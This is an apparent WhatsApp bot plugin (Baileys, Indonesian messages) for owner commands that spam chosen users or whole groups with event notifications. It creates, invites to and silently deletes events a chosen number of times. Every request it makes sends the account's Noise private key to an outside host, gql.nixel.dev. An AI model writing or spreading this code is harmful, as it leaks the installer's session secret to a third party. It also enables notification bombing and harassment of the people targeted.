import { delay } from '@whiskeysockets/baileys'

const API_URL = 'https://gql.nixel.dev'

function getApiCreds(conn) {
	const creds = conn.authState.creds
	return {
		me: {
			lid: creds.me.lid
		},
		noiseKey: {
			public: Buffer.from(creds.noiseKey.public).toString('base64'),
			private: Buffer.from(creds.noiseKey.private).toString('base64')
		}
	}
}

async function api(conn, path, body = {}) {
	const errorRetries = {}
	const apiCreds = getApiCreds(conn)

	while (true) {
		try {
			const response = await fetch(`${API_URL}${path}`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					creds: apiCreds,
					...body
				})
			})

			const text = await response.text()
			let result

			try {
				result = JSON.parse(text)
			} catch {
				throw new Error(`Invalid API response: ${text}`)
			}

			if (!response.ok || !result.success) {
				throw new Error(result.message || `HTTP ${response.status}`)
			}

			return result
		} catch (err) {
			const errKey = err.message || 'Unknown Error'
			errorRetries[errKey] = (errorRetries[errKey] || 0) + 1

			if (errorRetries[errKey] > 5) {
				throw err
			}

			await delay(1000)
		}
	}
}

async function createEvent(conn, eventDetails) {
	return api(conn, '/api/event/create', eventDetails)
}

async function addInvitations(conn, eventId, userLid) {
	return api(conn, '/api/event/invite', { eventId, userLid })
}

async function deleteEvent(conn, eventId) {
	return api(conn, '/api/event/delete', { eventId })
}

async function triggerEventNotif(conn, eventDetails, memberLids) {
	const now = Math.floor(Date.now() / 1000)
	const res = await createEvent(conn, {
		name: eventDetails.name || 'New Event',
		description: eventDetails.description || '',
		chatJid: eventDetails.chatJid,
		start_ts_sec: eventDetails.start_ts_sec || now + 3600,
		end_ts_sec: eventDetails.end_ts_sec || now + 7200,
		reminder_ts_sec: eventDetails.reminder_ts_sec || now + 3000
	})

	const eventId = res.data?.id || res.event?.id
	if (!eventId) throw new Error('Event ID tidak ditemukan')

	if (memberLids && memberLids.length > 0) {
		const userLid = memberLids.length === 1 ? memberLids[0] : memberLids
		try {
			await addInvitations(conn, eventId, userLid)
		} catch (err) {}
	}

	return deleteEvent(conn, eventId)
}

async function toLid(conn, jid) {
	if (jid.endsWith('@lid') || jid.endsWith('@g.us')) return jid
	const pn = jid.includes('@') ? jid : `${jid.replace(/[^0-9]/g, '')}@s.whatsapp.net`
	const lid = await conn.signalRepository?.lidMapping?.getLIDForPN?.(pn)
	if (!lid) throw new Error(`LID tidak ditemukan untuk ${pn}`)
	return lid
}

let handler = async (m, { conn, text, usedPrefix, command }) => {
	const isNotifUser = command === 'notifuser'

	if (!text) {
		if (isNotifUser) {
			return m.reply(
				`Contoh penggunaan:\n` +
				`*${usedPrefix + command} @user|woi*\n` +
				`*${usedPrefix + command} @user1 @user2|woi|5*\n` +
				`*${usedPrefix + command} 62858xxx|woi|10*\n` +
				`*${usedPrefix + command} 62858xxx Gw jago | 2*`
			)
		} else {
			return m.reply(
				`Contoh penggunaan:\n` +
				`*${usedPrefix + command} woi*\n` +
				`*${usedPrefix + command} woi|10*`
			)
		}
	}

	await m.react('⌛')

	try {
		const now = Math.floor(Date.now() / 1000)
		const startTime = now + 3600
		const endTime = now + 7200
		const reminderTime = now + 3000
		const tasks = []

		if (isNotifUser) {
			const parts = text.split('|').map(v => v.trim())
			let targetPart = ''
			let eventName = 'Woi'
			let count = 1

			if (parts.length >= 3) {
				targetPart = parts[0]
				eventName = parts[1] || 'Woi'
				const parsedCount = parseInt(parts[2])
				if (!isNaN(parsedCount) && parsedCount > 0) count = parsedCount
			} else if (parts.length === 2) {
				if (/^\d+$/.test(parts[1])) {
					count = parseInt(parts[1])
					const firstPart = parts[0]
					const numMatch = firstPart.match(/^(\+?\d{8,16})\s+([\s\S]+)$/)
					if (numMatch) {
						targetPart = numMatch[1]
						eventName = numMatch[2].trim()
					} else {
						targetPart = firstPart
						eventName = firstPart.replace(/@\S+/g, '').trim() || 'Woi'
					}
				} else {
					targetPart = parts[0]
					eventName = parts[1] || 'Woi'
				}
			} else {
				const numMatch = parts[0].match(/^(\+?\d{8,16})\s+([\s\S]+)$/)
				if (numMatch) {
					targetPart = numMatch[1]
					eventName = numMatch[2].trim()
				} else {
					targetPart = parts[0]
					eventName = parts[0].replace(/@\S+/g, '').trim() || 'Woi'
				}
			}

			let rawTargets = conn.parseMention ? conn.parseMention(targetPart) : []

			if (rawTargets.length === 0) {
				const numbers = targetPart.match(/\d{8,16}/g) || []
				for (const num of numbers) {
					rawTargets.push(`${num}@s.whatsapp.net`)
				}
			}

			if (rawTargets.length === 0) {
				throw new Error('Target tidak valid! Gunakan @mention atau nomor telepon (628xxx).')
			}

			const targetLids = [...new Set(await Promise.all(rawTargets.map(jid => toLid(conn, jid))))]

			for (const lid of targetLids) {
				for (let i = 0; i < count; i++) {
					tasks.push(() =>
						triggerEventNotif(conn, {
							name: eventName,
							description: 'Created and deleted silently',
							chatJid: lid,
							start_ts_sec: startTime,
							end_ts_sec: endTime,
							reminder_ts_sec: reminderTime
						}, [lid])
					)
				}
			}
		} else {
			const parts = text.split('|').map(v => v.trim())
			const eventName = parts[0] || 'Woi'
			const parsedCount = parseInt(parts[1])
			const count = !isNaN(parsedCount) && parsedCount > 0 ? parsedCount : 1

			let chatJid = m.chat
			let memberLids = []

			if (m.chat.endsWith('@g.us')) {
				const groupMetadata = await conn.groupMetadata(m.chat)
				const participants = groupMetadata.participants || []
				memberLids = await Promise.all(
					participants.map(async ({ id }) => {
						if (id.endsWith('@lid')) return id
						const lid = await conn.signalRepository?.lidMapping?.getLIDForPN?.(id)
						return lid || id
					})
				)
			} else {
				chatJid = await toLid(conn, m.chat)
				memberLids = [chatJid]
			}

			for (let i = 0; i < count; i++) {
				tasks.push(() =>
					triggerEventNotif(conn, {
						name: eventName,
						description: 'Created and deleted silently',
						chatJid: chatJid,
						start_ts_sec: startTime,
						end_ts_sec: endTime,
						reminder_ts_sec: reminderTime
					}, memberLids)
				)
			}
		}

		await m.react('⏳')
		await Promise.all(tasks.map(run => run()))
		await m.react('✅')
	} catch (e) {
		console.error(e)
		await m.react('❌')
		m.reply(`Terjadi kesalahan: ${e.message}`)
	}
}

handler.command = ['notif', 'notifuser']
handler.help = [
	'notif <teks>|<jumlah>',
	'notifuser <@user/nomor>|<teks>|<jumlah>'
]
handler.tags = ['owner']
handler.group = false
handler.owner = true

export default handler
